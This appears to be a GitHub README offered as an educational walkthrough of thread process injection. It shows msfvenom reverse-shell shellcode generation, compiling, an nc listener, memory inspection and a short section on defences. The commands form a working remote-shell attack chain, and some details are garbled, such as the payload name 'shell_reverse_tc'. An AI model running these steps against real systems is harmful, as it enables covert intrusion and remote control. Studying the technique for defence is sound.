# SimpleTPI

writing these materials for myself and for educational purposes .i will write long explanetion about every line of code for better understanding ..




So, what is thread process injection?

TPI is a technique that allows an attacker to inject code into a running process and create a new thread that will execute the injected code. The goal of the attacker with this technique is to take control of the process. This is often used to evade detection, as the injected code runs within the context of a legitimate process and "hides" in the stack, making it difficult for security software to detect.

I will run the script by creating a VM in my case, is Kali Linux.

In the console, we type the command below:

```
ifconfig
```
Then take the VM IP we want to use as a "hacker" machine:

```
eth: flags=8908<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 2938
    options=3<RXCSUM,TXCSUM>
    ether xx:xx:xx:xx:xx:xx 
    inet xx.xx.xxx.xx netmask 0xfff0 broadcast xx.xx.xx.xx
```
I choose to use this exploit for the reverse shell, of course, you can choose any:

```
msfvenom -p windows/x64/shell_reverse_tc LHOST=xx.xx.xxx.xx LPORT=4444 -f c
```
Then we have the shell code, and we will insert it in the line of code - shellcode[] = {`here`}


Once we have the script as shown in the screenshot above, we will change the file mode for the .exe using the command 
```
cl /Tc <filename>.cpp
```
 Then, we will switch back to the VM and listen to the specified port using the command
```
 nc -nlvp 4444
```
 We will then execute the program on our "hacker station" and we should have access.
 
 <img width="552" alt="Screenshot 2023-01-24 at 13 58 20" src="https://user-images.githubusercontent.com/122444563/214533891-c84c47b9-cf2b-4ae4-89d4-dd2e28b1e75b.png">



To verify that the process has been injected, we can use the HackerProcess tool and find the notepad.exe process Properties -> Memory -> Protection column RWX (Read, Write, Execute) and can find in the memory region the reverse shell code.

![Screenshot 2023-01-25 at 10 50 03](https://user-images.githubusercontent.com/122444563/214526424-fedc65e8-3ddd-40f6-b285-5f9486dae2e6.png)

To defend against process injection in a company, it is important to keep in mind that no single solution can completely protect against thread process injection, and it is necessary to use a combination of techniques to maximize the security of your system. Using memory protection techniques like ASLR and DEP can make it more difficult for an attacker to inject code into a running process by making it harder to predict the location of memory blocks. Additionally, endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process.
_____________________
